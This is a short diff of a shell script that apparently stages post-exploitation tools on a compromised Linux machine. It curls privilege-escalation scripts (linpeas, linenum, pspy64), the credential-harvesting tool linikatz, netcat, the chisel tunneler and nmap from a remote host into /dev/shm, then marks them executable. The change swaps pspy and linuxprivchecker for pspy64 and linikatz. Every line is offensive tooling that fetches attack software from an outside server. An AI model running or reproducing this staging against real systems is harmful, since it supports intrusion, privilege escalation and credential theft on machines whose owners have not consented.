@@ -70,8 +70,8 @@ echo -e "\e[34m[+]\e[0m Downloading privilege escaltion scripts from $ip:$port t
 echo
 curl $ip:$port/linpeas.sh -o /dev/shm/linpeas.sh 
 curl $ip:$port/linenum.sh -o /dev/shm/linenum.sh 
-curl $ip:$port/pspy -o /dev/shm/pspy 
-curl $ip:$port/linuxprivchecker.py -o /dev/shm/linuxprivchecker.py 
+curl $ip:$port/pspy64 -o /dev/shm/pspy64 
+curl $ip:$port/linikatz.sh -o /dev/shm/linikatz.sh 
 curl $ip:$port/nc -o /dev/shm/nc
 curl $ip:$port/chisel -o /dev/shm/chisel
 curl $ip:$port/nmap -o /dev/shm/nmap
@@ -80,7 +80,8 @@ echo
 echo -e "\e[34m[+]\e[0m Adding execute permissions..."
 chmod +x /dev/shm/linpeas.sh
 chmod +x /dev/shm/linenum.sh
-chmod +x /dev/shm/pspy
+chmod +x /dev/shm/linikatz.sh
+chmod +x /dev/shm/pspy64
 chmod +x /dev/shm/nc
 chmod +x /dev/shm/chisel
 chmod +x /dev/shm/nmap
